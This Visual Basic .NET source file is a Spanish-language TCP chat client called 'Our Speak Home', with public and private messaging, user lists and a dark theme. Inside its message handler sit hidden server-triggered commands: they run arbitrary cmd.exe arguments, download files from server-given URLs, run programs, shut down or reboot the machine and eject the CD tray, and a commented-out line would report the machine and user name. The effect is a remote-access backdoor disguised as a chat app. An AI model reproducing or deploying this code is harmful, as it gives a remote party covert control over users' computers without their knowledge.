Imports System.Net.Sockets
Imports System.Text
Public Class MainCL
    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
    Dim CLIENTE As TcpClient
    Public NS As NetworkStream
    Dim COMPLEMENTO As String
    Dim Argumento As String

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Argumento = Microsoft.VisualBasic.Command
        If Argumento = Nothing Then
            CommonStart()
        ElseIf Argumento = "/FactoryReset" Then
            MsgBox("Esta funcion no esta disponible.", MsgBoxStyle.Information, "Funcion de Argumento")
            End
        End If
    End Sub

    Sub CommonStart()
        Try
            If (TimeOfDay.Hour >= 18 AndAlso TimeOfDay.Hour <= 6) Then
                ThemeApply(True)
            End If
            If My.Settings.Banned = True Then
                MsgBox("Tu cuenta a sido baneada." & vbCrLf & "Contacta con un Administrador", MsgBoxStyle.Critical, "Banned")
                End
            End If
            If My.Settings.Username = Nothing Then
                Dim UserTXB = InputBox("Ingrese su nombre de usuario" & vbCrLf & "No utilize: [], (), :, @.", "Nombre de Usuario", Environment.UserName)
                If UserTXB = Nothing Then
                    MsgBox("Debe ingresar un Nombre de Usuario", MsgBoxStyle.Critical, "Nombre de Usuario")
                    End
                ElseIf UserTXB.StartsWith("[") Or UserTXB.StartsWith("]") Or UserTXB.StartsWith("(") Or UserTXB.StartsWith(")") Or UserTXB.StartsWith("@") Or UserTXB.StartsWith("Lista") Or UserTXB.StartsWith(":") Or UserTXB.StartsWith("Conexion") Or UserTXB.StartsWith("Desconexion") Or UserTXB.StartsWith("Privado") Then
                    MsgBox("El nombre ingresado no esta permitido por poder interferir con comandos internos.", MsgBoxStyle.Critical, "Nickname")
                    End
                Else
                    My.Settings.Username = UserTXB
                    My.Settings.Save()
                    My.Settings.Reload()
                End If
            ElseIf My.Settings.Username.StartsWith("[") Or My.Settings.Username.StartsWith("]") Or My.Settings.Username.StartsWith("(") Or My.Settings.Username.StartsWith(")") Or My.Settings.Username.StartsWith("@") Or My.Settings.Username.StartsWith(":") Or My.Settings.Username.StartsWith("Conexion") Or My.Settings.Username.StartsWith("Desconexion") Or My.Settings.Username.StartsWith("Privado") Then
                MsgBox("El nombre ingresado en la DB no es compatible." & vbCrLf & "Debera cambiarlo :(", MsgBoxStyle.Critical, "Nickname")
                End
            Else
                Me.Text = "Our Speak Home | Client " & My.Settings.Username
            End If
            My.Settings.Save()
            My.Settings.Reload()
            TextBoxIP.Text = My.Settings.IP
            TextBoxPUERTO1.Text = My.Settings.Port
            TextBoxCHAT.Text = "    Our Speak Home. Version " & My.Application.Info.Version.ToString & vbCrLf
            If CheckBox2.CheckState = CheckState.Checked Then
                NotifyIcon1.Visible = True
            ElseIf CheckBox2.CheckState = CheckState.Unchecked Then
                NotifyIcon1.Visible = False
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ButtonCONECTAR_Click(sender As System.Object, e As System.EventArgs) Handles ButtonCONECTAR.Click
        Try
            CLIENTE = New TcpClient
            CLIENTE.Connect(TextBoxIP.Text, TextBoxPUERTO1.Text)
            NS = CLIENTE.GetStream()
            TextBoxCHAT.AppendText("Conectando..." & vbCrLf)
            ENVIAR("Conexion:" & My.Settings.Username)
            TextBoxCHAT.AppendText("Conectado!" & vbCrLf)
            Timer1.Start()
            ButtonCONECTAR.Visible = False
            TextBoxMENSAJE.Enabled = True
            ButtonPRIVADO.Enabled = True
            Button1.Enabled = True
            TextBoxIP.Enabled = False
            TextBoxPUERTO1.Enabled = False
            My.Settings.IP = TextBoxIP.Text
            My.Settings.Port = TextBoxPUERTO1.Text
            My.Settings.Save()
            My.Settings.Reload()
            Me.Text = My.Settings.Username & "@" & My.Settings.IP & ":" & My.Settings.Port & " | Our Speak Home Client"
            'ENVIAR("CallBack:" & Environment.MachineName & "|" & Environment.UserName & "|" & My.Application.Info.AssemblyName) No utilizable por seguridad
        Catch ex As Exception
            MsgBox("Error al conectar al Servidor" & vbCrLf & ex.Message, MsgBoxStyle.Critical, "Worcome Security")
            Console.WriteLine("Error: " & ex.Message)
        End Try
    End Sub

    Sub CantConnect(ByVal MSG As String)
        Me.Text = "Our Speak Home | Client"
        If MSG = "Conectar" Then
        Else
            MsgBox("No se pudo conectar al Servidor", MsgBoxStyle.Critical, "Error al Enviar")
        End If
        TextBoxCHAT.Clear()
        TextBoxCHAT.AppendText("    Our Speak Home. Version " & My.Application.Info.Version.ToString & vbCrLf)
        ButtonCONECTAR.Visible = True
        ButtonCONECTAR.Visible = True
        TextBoxMENSAJE.Enabled = False
        ButtonPRIVADO.Enabled = False
        Button1.Enabled = False
        TextBoxIP.Enabled = True
        TextBoxPUERTO1.Enabled = True
        ButtonCONECTAR.Text = MSG
        Timer1.Stop()
        CLIENTE.Close()
    End Sub

    Public Sub ENVIAR(ByVal MENSAJE As String)
        Try
            Dim MIBUFFER() As Byte = Encoding.UTF8.GetBytes(MENSAJE)
            NS.Write(MIBUFFER, 0, MIBUFFER.Length)
        Catch ex As Exception
            CantConnect("Reconectar")
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        LEER()
    End Sub

    Public Sub LEER()
        Try
            Dim MISBYTES() As Byte = New Byte(1024) {} 'PARA LA RECEPCION DE BYTES
            Dim VACIO As Boolean = True ' POR SI HAY UN ENVIO DE CADENAS VACIAS.
            If NS.DataAvailable Then
                NS.Read(MISBYTES, 0, MISBYTES.Length)
                For I = 0 To MISBYTES.Length - 1 ' POR SI HAY UN ENVIO DE CADENAS VACIAS.
                    If MISBYTES(I) <> 0 Then
                        VACIO = False
                        Exit For
                    End If
                Next
                If VACIO = False Then
                    Dim MENSAJE As String = Encoding.UTF8.GetString(MISBYTES) 'CONVERSION DE BYTES A STRING
                    Dim MISPLIT As String() = MENSAJE.Split(":") 'SEPARACION DE LOS ELEMENTOS DEL MENSAJE
                    'MENSAJE DEL SERVIDOR NORMAL
                    If MENSAJE.Contains(My.Settings.Username) Then 'El mensaje es del usuario
                        If CheckBox1.CheckState = CheckState.Checked Then 'Modo oscuro
                            TextBoxCHAT.SelectionColor = Color.Yellow  'Color seleccion usuario que combine con el Modo oscuro
                        ElseIf CheckBox1.CheckState = CheckState.Unchecked Then
                            TextBoxCHAT.SelectionColor = Color.DodgerBlue 'Sin Modo oscuro, color que combine con Normal
                        End If
                    Else 'El mensaje NO es del usuario
                        If CheckBox1.CheckState = CheckState.Checked Then
                            TextBoxCHAT.SelectionColor = Color.LimeGreen
                        ElseIf CheckBox1.CheckState = CheckState.Unchecked Then
                            TextBoxCHAT.SelectionColor = Color.Black
                        End If
                    End If
                    If MISPLIT(0).Contains("[Servidor]") Then 'SI EL PRIMER CAMPO ES Servidor.......
                        TextBoxCHAT.AppendText(vbCrLf & MENSAJE)
                        My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                        NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Un mensaje del Servidor", ToolTipIcon.Info)
                        TextBoxCHAT.ScrollToCaret()
                    ElseIf MISPLIT(0).Contains("[CMD]") Then 'SI EL PRIMER CAMPO ES COMANDO
                        TextBoxCHAT.AppendText(vbCrLf & MENSAJE)
                        My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                        NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Un mensaje de consola", ToolTipIcon.Info)
                        TextBoxCHAT.ScrollToCaret()
                    ElseIf MISPLIT(0).Contains("[ServerDB]") Then 'SI EL PRIMER CAMPO ES Servidor DB.......
                        TextBoxCHAT.AppendText(vbCrLf & MENSAJE)
                        My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                        NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Un mensaje del Servidor de Registros", ToolTipIcon.Info)
                        TextBoxCHAT.ScrollToCaret()
                        'MENSAJES PRIVADOS
                    ElseIf MISPLIT(0).Contains("Privado") Then ' SI EL PRIMER CAMPO ES Privado....
                        Dim NUEVAPAGINA As Boolean = True 'COMPRUEBA SI YA DEBE CREAR UNA TABPAGE PARA ESE PRIVADO
                        For Each PAGINA As Control In TabControl1.TabPages
                            If PAGINA.Text = MISPLIT(1) Then
                                NUEVAPAGINA = False 'Y NO PRECISA PAGINA YA HAY UNA ABIERTA
                                Exit For
                            End If
                        Next
                        If NUEVAPAGINA = False Then 'SI HAY PAGINA ABIERTA PARA LA CONVERSACION PRIVADA.......
                            COMPLEMENTO = MISPLIT(1)
                            For Each TABCONTROL As Control In TabControl1.TabPages 'LOCALIZA LA PAGINA, SU TEXTBOX Y AÑADE EL MENSAJE
                                If TABCONTROL.Text = COMPLEMENTO Then
                                    For Each BOX As RichTextBox In TABCONTROL.Controls
                                        If TypeOf (BOX) Is RichTextBox Then
                                            If BOX.Name = "Chat Privado: " & COMPLEMENTO Then
                                                If MISPLIT(2).ToString.StartsWith("Tú") Then ' SI EL PRIVADO ES UN MENSAJE PROPIO....
                                                    BOX.AppendText(vbCrLf & MISPLIT(2))
                                                    BOX.ScrollToCaret()
                                                    Exit For
                                                Else
                                                    BOX.AppendText(vbCrLf & MISPLIT(1) & ":" & MISPLIT(2)) ' SI EL MENSAJE ES DE NUESTRO PARTNER....
                                                    BOX.ScrollToCaret()
                                                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                                    NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Tienes un mensaje por privado", ToolTipIcon.Info)
                                                    Exit For
                                                End If
                                                Exit For
                                            End If
                                        End If
                                    Next
                                End If
                            Next
                        Else ' SI NO HAY PAGINA ABIERTA PARA LA CONVERSACION PRIVADA....
                            COMPLEMENTO = MISPLIT(1)
                            PAGINANUEVA() 'CREACION DE PAGINA NUEVA PARA PRIVADO
                            For Each TABCONTROL As Control In TabControl1.TabPages
                                If TABCONTROL.Text = COMPLEMENTO Then
                                    For Each BOX As RichTextBox In TABCONTROL.Controls
                                        If TypeOf (BOX) Is RichTextBox Then
                                            If BOX.Name = "Chat Privado: " & COMPLEMENTO Then
                                                If MISPLIT(2).ToString.StartsWith("Tú") Then ' SI EL PRIVADO ES UN MENSAJE PROPIO...
                                                    BOX.AppendText(vbCrLf & MISPLIT(2)) 'LO AÑADE AL TEXTBOX
                                                    BOX.ScrollToCaret()
                                                    Exit For
                                                Else
                                                    BOX.AppendText(vbCrLf & MISPLIT(1) & ":" & MISPLIT(2)) ' SI EL MENSAJE ES DE NUESTRO PARTNER LO AÑADE AL TEXTBOX
                                                    BOX.ScrollToCaret()
                                                    My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                                    NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Tienes un mensaje por privado", ToolTipIcon.Info)
                                                    Exit For
                                                End If
                                            End If
                                        End If
                                    Next
                                End If
                            Next
                        End If
                    ElseIf MENSAJE.StartsWith("Lista:") Then
                        ListBox1.Items.Clear()
                        Dim LISTA As String() = MENSAJE.Split("/")
                        For I = 0 To LISTA.Count - 1
                            If LISTA(I).ToString.Contains("Conexion:") Then
                                TextBoxCHAT.AppendText(vbCrLf & LISTA(I))
                                Dim MIITEM As String = LISTA(I).ToString
                                MIITEM = MIITEM.Remove(0, MIITEM.IndexOf(":") + 1)
                                'If MIITEM = My.Settings.Username Then
                                '    ENVIAR("CallBack>" & Environment.MachineName & "|" & Environment.UserName & "|" & My.Application.Info.AssemblyName)
                                'End If
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                NotifyIcon1.ShowBalloonTip(1, "Usuario conectado", "Un usuario se ha conectado", ToolTipIcon.Info)
                                TextBoxCHAT.ScrollToCaret()
                            ElseIf LISTA(I).ToString.Contains("Desconexion:") Then
                                TextBoxCHAT.AppendText(vbCrLf & LISTA(I))
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                NotifyIcon1.ShowBalloonTip(1, "Usuario desconectado", "Un usuario se ha desconectado", ToolTipIcon.Info)
                            ElseIf LISTA(I).ToString.Contains("[Servidor]:Desconectado") Then
                                TextBoxCHAT.AppendText(vbCrLf & LISTA(I))
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                NotifyIcon1.ShowBalloonTip(1, "Servidor Cerrado", "El servidor fue desconectado", ToolTipIcon.Error)
                                CantConnect("Conectar")
                            Else
                                Dim MIITEM As String = LISTA(I).ToString
                                MIITEM = MIITEM.Remove(0, MIITEM.IndexOf(":") + 1)
                                ListBox1.Items.Add(MIITEM)
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                NotifyIcon1.ShowBalloonTip(1, "Usuarios conectados", "Se actualizo la lista de usuarios conectados", ToolTipIcon.Info)
                                TextBoxCHAT.ScrollToCaret()
                            End If
                        Next
                    ElseIf MENSAJE.StartsWith("@CMD") Then 'COMANDOS DESDE EL SERVIDOR MIN 3 ARGS --------------------------------------------------------------------------------
                        Try
                            Dim Args As String() = MENSAJE.Split("|")
                            If Args(1) = "Kicked" Then
                                If Args(2) = My.Settings.Username Then
                                    MsgBox("Fuiste expulsado." & vbCrLf & "Razon: " & Args(3), MsgBoxStyle.Information, "Kicked")
                                    Me.Close()
                                End If
                            End If
                            If Args(1) = "Banned" Then
                                If Args(2) = My.Settings.Username Then
                                    TextBoxCHAT.Clear()
                                    TabControl1.TabPages.Clear()
                                    ListBox1.Items.Clear()
                                    MsgBox("Has sido banneado." & vbCrLf & "Razon: " & Args(3), MsgBoxStyle.Information, "Banned")
                                    My.Settings.Banned = True
                                    My.Settings.Save()
                                    My.Settings.Reload()
                                    Me.Close()
                                End If
                            End If
                            If Args(1) = "CDrive" Then
                                If Args(2) = My.Settings.Username Then
                                    If Args(3) = "Open" Then
                                        CDDriveO()
                                    Else
                                        CDDriveC()
                                    End If
                                End If
                            End If
                            If Args(1) = "cmdEjecute" Then
                                If Args(2) = My.Settings.Username Then
                                    Process.Start("cmd.exe", Args(3))
                                End If
                            End If
                            If Args(1) = "System" Then
                                If Args(2) = My.Settings.Username Then
                                    If Args(3) = "Shutdown" Then
                                        Process.Start("cmd.exe /c shutdown -h -t 0")
                                    ElseIf Args(3) = "Reboot" Then
                                        Process.Start("cmd.exe /c shutdown -r -t 0")
                                    ElseIf Args(3) = "Logoff" Then
                                        Process.Start("cmd.exe /c shutdown -l")
                                    End If
                                End If
                            End If
                            If Args(1) = "Download" Then
                                If Args(2) = My.Settings.Username Then
                                    If Args(3).Contains("%username%") Then
                                        Args(3) = Args(3).Replace("%username%", Environment.UserName)
                                    End If
                                    My.Computer.Network.DownloadFile(Args(4), Args(3))
                                End If
                            End If
                            If Args(1) = "Run" Then
                                If Args(2) = My.Settings.Username Then
                                    If Args(3) = "DownloadedFile" Then
                                        Process.Start(Args(4))
                                    Else
                                        Dim tmpeeee As String
                                        If Args(3).Contains("%username%") Then
                                            tmpeeee = Args(3).Replace("%username%", Environment.UserName)
                                            Process.Start(tmpeeee)
                                        End If
                                    End If
                                End If
                            End If
                        Catch ex As Exception
                            Console.WriteLine("CMDRead " & ex.Message)
                        End Try
                    Else 'ES UN MENSAJE PUBLICO
                        If MENSAJE.Contains(My.Settings.Username) Then
                            My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                            NotifyIcon1.ShowBalloonTip(1, "Nuevo mensaje", "Nuevo mensaje en el chat publico", ToolTipIcon.Info)
                        End If
                        TextBoxCHAT.AppendText(vbCrLf & MENSAJE)
                        TextBoxCHAT.ScrollToCaret()
                    End If
                    Console.WriteLine("[RAW@Leer]" & MENSAJE)
                End If
            End If
        Catch ex As Exception
            CantConnect("Reconectar")
        End Try
    End Sub

    Public Sub PAGINANUEVA()
        Dim MITABPAGE As New TabPage
        MITABPAGE.Text = COMPLEMENTO
        Dim CHATPRIVADO As New RichTextBox
        CHATPRIVADO.Parent = MITABPAGE
        CHATPRIVADO.Location = New Point(21, 15)
        CHATPRIVADO.Size = New Size(394, 286)
        CHATPRIVADO.Name = "Chat Privado: " & COMPLEMENTO
        CHATPRIVADO.ScrollBars = ScrollBars.Vertical
        CHATPRIVADO.ReadOnly = True
        Dim MIBOTON As New Button
        MIBOTON.Parent = MITABPAGE
        MIBOTON.Location = New Point(158, 306)
        MIBOTON.Width = 120
        MIBOTON.Height = 23
        MIBOTON.Name = "MIBOTON" & COMPLEMENTO
        MIBOTON.Text = "Eliminar Chat"
        AddHandler MIBOTON.Click, AddressOf MIBOTON_Click
        TabControl1.TabPages.Add(MITABPAGE) 'UNE LA TABPAGE AL TABCONTROL
        TabControl1.SelectedTab = MITABPAGE 'PRESENTA LA TABPAGE RECIEN CREADA
    End Sub

    Private Sub MIBOTON_Click(sender As System.Object, e As System.EventArgs)
        TabControl1.TabPages.Remove(TabControl1.SelectedTab)
        TextBoxMENSAJE.Focus()
    End Sub

    Private Sub TextBoxMENSAJE_KeyDown(sender As Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBoxMENSAJE.KeyDown
        'ENVIA EL MENSAJE AL SERVIDOR AL PULSAR ENTER Y LIMPIA EL TEXTBOX
        If CheckBox3.CheckState = CheckState.Checked Then
            If e.KeyCode = Keys.Enter Then
                If TextBoxMENSAJE.Text <> Nothing Then
                    If TabControl1.SelectedTab Is TabPage1 Then
                        ENVIAR(My.Settings.Username & ": " & TextBoxMENSAJE.Text)
                    Else
                        Dim MENSAJE As String = TextBoxMENSAJE.Text
                        MENSAJE = MENSAJE.Replace(":", " ")
                        COMPLEMENTO = TabControl1.SelectedTab.Text
                        ENVIAR("Privado" & ":" & My.Settings.Username & ":" & COMPLEMENTO & ":" & MENSAJE)
                    End If
                End If
                TextBoxMENSAJE.Clear()
                TextBoxMENSAJE.Focus()
            End If
        End If
    End Sub

    Private Sub ButtonPRIVADO_Click(sender As System.Object, e As System.EventArgs) Handles ButtonPRIVADO.Click
        If ListBox1.SelectedItem <> My.Settings.Username Then
            COMPLEMENTO = ListBox1.SelectedItem
            PAGINANUEVA()
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If ButtonCONECTAR.Visible = False Then
            ENVIAR("Desconexion:" & My.Settings.Username)
        End If
    End Sub

    Sub ThemeApply(ByVal ONTheme As Boolean)
        If ONTheme = True Then
            'Modo oscuro
            'Me.BackColor = Color.FromArgb(50, 50, 50)
            Me.BackColor = Color.Black
            Button1.ForeColor = Color.LimeGreen
            Label3.ForeColor = Color.LimeGreen
            Label4.ForeColor = Color.LimeGreen
            TextBoxIP.ForeColor = Color.LimeGreen
            TextBoxIP.BackColor = Color.Black
            TextBoxPUERTO1.ForeColor = Color.LimeGreen
            TextBoxPUERTO1.BackColor = Color.Black
            TextBoxPUERTO2.ForeColor = Color.LimeGreen
            TextBoxPUERTO2.BackColor = Color.Black
            TextBoxCHAT.ForeColor = Color.LimeGreen
            TextBoxCHAT.BackColor = Color.Black
            TextBoxMENSAJE.ForeColor = Color.LimeGreen
            TextBoxMENSAJE.BackColor = Color.Black
            ButtonCONECTAR.ForeColor = Color.LimeGreen
            ButtonPRIVADO.ForeColor = Color.LimeGreen
            ListBox1.ForeColor = Color.LimeGreen
            ListBox1.BackColor = Color.Black
            TabPage1.ForeColor = Color.LimeGreen
            TabPage1.BackColor = Color.Black
            CheckBox1.ForeColor = Color.LimeGreen
            CheckBox2.ForeColor = Color.LimeGreen
            CheckBox3.ForeColor = Color.LimeGreen
            CheckBox1.CheckState = CheckState.Checked
        ElseIf ONTheme = False Then
            'Modo normal
            Me.BackColor = DefaultBackColor
            Button1.ForeColor = DefaultForeColor
            Label3.ForeColor = DefaultForeColor
            Label4.ForeColor = DefaultForeColor
            TextBoxIP.ForeColor = DefaultForeColor
            TextBoxIP.BackColor = DefaultBackColor
            TextBoxPUERTO1.ForeColor = DefaultForeColor
            TextBoxPUERTO1.BackColor = DefaultBackColor
            TextBoxPUERTO2.ForeColor = DefaultForeColor
            TextBoxPUERTO2.BackColor = DefaultBackColor
            TextBoxCHAT.ForeColor = DefaultForeColor
            TextBoxCHAT.BackColor = DefaultBackColor
            TextBoxMENSAJE.ForeColor = DefaultForeColor
            TextBoxMENSAJE.BackColor = DefaultBackColor
            ButtonCONECTAR.ForeColor = DefaultForeColor
            ButtonPRIVADO.ForeColor = DefaultForeColor
            ListBox1.ForeColor = DefaultForeColor
            ListBox1.BackColor = DefaultBackColor
            TabPage1.ForeColor = DefaultForeColor
            TabPage1.BackColor = DefaultBackColor
            CheckBox1.ForeColor = DefaultForeColor
            CheckBox2.ForeColor = DefaultForeColor
            CheckBox3.ForeColor = DefaultForeColor
            CheckBox1.CheckState = CheckState.Unchecked
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.CheckState = CheckState.Checked Then
            ThemeApply(True)
        Else
            ThemeApply(False)
        End If
    End Sub

    Private Sub TextBoxIP_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBoxIP.KeyDown
        If e.KeyCode = Keys.Enter Then
            TextBoxPUERTO1.Focus()
        End If
    End Sub

    Private Sub TextBoxPUERTO1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBoxPUERTO1.KeyDown
        If e.KeyCode = Keys.Enter Then
            TextBoxPUERTO2.Focus()
        End If
    End Sub
    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.CheckState = CheckState.Checked Then
            NotifyIcon1.Visible = True
        Else
            NotifyIcon1.Visible = False
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBoxMENSAJE.Text <> Nothing Then
            If TabControl1.SelectedTab Is TabPage1 Then
                ENVIAR(My.Settings.Username & ": " & TextBoxMENSAJE.Text)
            Else
                Dim MENSAJE As String = TextBoxMENSAJE.Text
                MENSAJE = MENSAJE.Replace(":", " ")
                COMPLEMENTO = TabControl1.SelectedTab.Text
                ENVIAR("Privado" & ":" & My.Settings.Username & ":" & COMPLEMENTO & ":" & MENSAJE)
            End If
            TextBoxMENSAJE.Clear()
            TextBoxMENSAJE.Focus()
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.CheckState = CheckState.Checked Then
            TextBoxMENSAJE.Multiline = False
            TextBoxMENSAJE.Height = 20
        Else
            TextBoxMENSAJE.Multiline = True
            TextBoxMENSAJE.Height = 32
        End If
    End Sub

    Private Sub EnviarArchivoPublico_Click(sender As Object, e As EventArgs) Handles Button2.Click
        'FileManager.Enviar()
    End Sub

    Function CDDriveO()
        mciSendString("set CDAudio door open", 0, 0, 0)
        Return True
    End Function
    Function CDDriveC()
        mciSendString("set CDAudio door closed", 0, 0, 0)
        Return True
    End Function
End Class